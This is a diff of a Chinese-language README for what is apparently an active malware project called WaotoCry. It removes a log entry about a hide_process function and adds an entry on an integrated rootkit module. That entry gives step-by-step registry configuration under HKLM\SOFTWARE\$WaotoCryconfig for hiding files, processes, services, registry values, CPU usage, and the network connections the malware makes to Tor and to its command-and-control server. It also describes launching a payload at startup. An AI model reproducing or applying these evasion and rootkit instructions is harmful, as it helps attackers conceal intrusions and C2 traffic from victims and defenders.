@@ -1,7 +1,5 @@
 # Walcome To 0x7E9FB Team Project #
-![FI](https://github.com/518651/0x7E9FB-Net-Project/blob/master/1195096017.jpeg)
-
-
+![FI](https://github.com/518651/0x7E9FB-Net-Project/blob/master/Team.jpg)
 *项目的名字我暂时没有想好，你们可以去想想*
 
 > 写在开头
@@ -213,23 +211,98 @@ WAR:请注意若要对函数进行调用或者其他操作*add_double_data*及*B
 	最后对reanname进行编写后对main函数正式流程编写并封装加入攻击模块
 
 
-
-
-----------
- 
-> **WaotoCry-TS-2.0.1**[*R3转R0开发，至此代码工程进入内核操作*]
-
 ----------
 
-> TIME:2021/11/25 21:41:51 
 
-	开始对WaotoCry第二代进行内核代码编写,WaotoCry将从单文件的Release DLL attack转为分化母体PROCESS!
-	此次更新为:WaotoCry 2.0.1版
-	新增[HIDE PROCESS]函数，可让当前WaotoCry通过断开链表的方式躲过USER的初级检测，因为要保证整个框架，函数当只能完成对Taskmgr.exe隐藏，
-	对于PROCESS HACHER及其他进程检测没有加入。后期在考虑是否进行改进.
+> TIME:2021/11/28 22:47:01  WaotoCry成功装载ROOTkit模块
+
+	各位开发者们如果需要调用Rootkit就请使用InstallR77函数调用.
+
+现在Rootkit支持一下隐藏功能:
+
+隐藏任何带**$WaotoCry**前缀的*文件、路径、计划任务、注册表项和值、服务以及TCP 和 UDP 连接和!!!CPU使用率!!!*
+
+配置WaotoCry的Rootkit模块:
+请各位开发者们创建/写入注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig
+
+如果你想隐藏PID(进程号)就请在上面的注册表路径下创建**pid项**,写入的数据格式:
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\pid
 	
-	USE:hide_process funtion
-	hide_process(string process_name);
+	1. 名称--WaotoCry
+	2. 数据类型为--REG_DWORD
+	3. 数值--0x000014f0(5360)
+
+如果你想隐藏process_name(进程名称)就请在上面的注册表路径下创建**process_names项**,写入的数据格式:
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\process_names
 	
-	传入需要隐藏的进程名即可;
-		
+	1. 名称--process_1
+	2. 数据类型为--REG_SZ
+	3. 数值--QQ.exe
+
+如果你想隐藏注册表项和值(path\date)就请在上面的注册表路径下创建**$WaotoCry(项)\$WaotoCrymykey(值)**,写入的数据格式:
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\$WaotoCry
+	
+	1. 名称--$WaotoCry
+	2. 数据类型为--REG_SZ
+	3. 数值--$WaotoCry(隐藏的是所有注册表前缀值为$WaotoCry的项)
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\$WaotoCrymykey
+	
+	1. 名称--$WaotoCrymykey
+	2. 数据类型为--REG_SZ
+	3. 数值--$WaotoCrymykey(隐藏的是所有注册表前缀值为$WaotoCrymykey的值)
+
+
+
+
+如果你想隐藏服务(Service)就请在上面的注册表路径下创建**service_names项**,写入的数据格式:
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\service_names
+	
+	1. 名称--HiddenServiceNames
+	2. 数据类型为--REG_SZ
+	3. 数值--WindowsOryouwanthidename(隐藏的是所有WindowsOryouwanthidename服务)
+
+tcp_local
+如果你想隐藏网络行为(network)就请在上面的注册表路径下创建**tcp_local(隐藏本地TCP连接)、tcp_remote(隐藏远程TCP连接)、udp**,写入的数据格式:
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\tcp_local
+	
+	1. 名称--WaotoCry_to_tor(隐藏WaotoCry和洋葱路由的连接)
+	2. 数据类型为--REG_SZ
+	3. 数值--9050(隐藏的是TOR在本地监听的端口)
+
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\tcp_remote
+	
+	1. 名称--C2SERVER_TO_MY(隐藏WaotoCry的C2服务器对本地WaotoCry的连接)
+	2. 数据类型为--REG_SZ
+	3. 数值--4000(隐藏的是TOR在本地监听的端口)
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\udp
+	
+	1. 名称--WaotoCry_udp_config(隐藏指定的进、出UDP端口)
+	2. 数据类型为--REG_SZ
+	3. 数值--4001
+
+
+
+如果你想启动进程(Start Process)就请在上面的注册表路径下创建**startup**,写入的数据格式:
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\startup
+	
+	1. 名称--WaotoCry_start_process(启动指定的进程)
+	2. 数据类型为--REG_SZ
+	3. 数值--C:\Process File(X86)\^Waoto_ep.exe
+
+
+如果你想隐藏目录中的进程(DIR Process)就请在上面的注册表路径下创建**paths**,写入的数据格式:
+
+	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\paths
+	
+	1. 名称--WaotoCry_hide_process(隐藏指定的目录下的进程)
+	2. 数据类型为--REG_SZ
+	3. 数值--C:\Process File(X86)\^Waoto_ep.exe
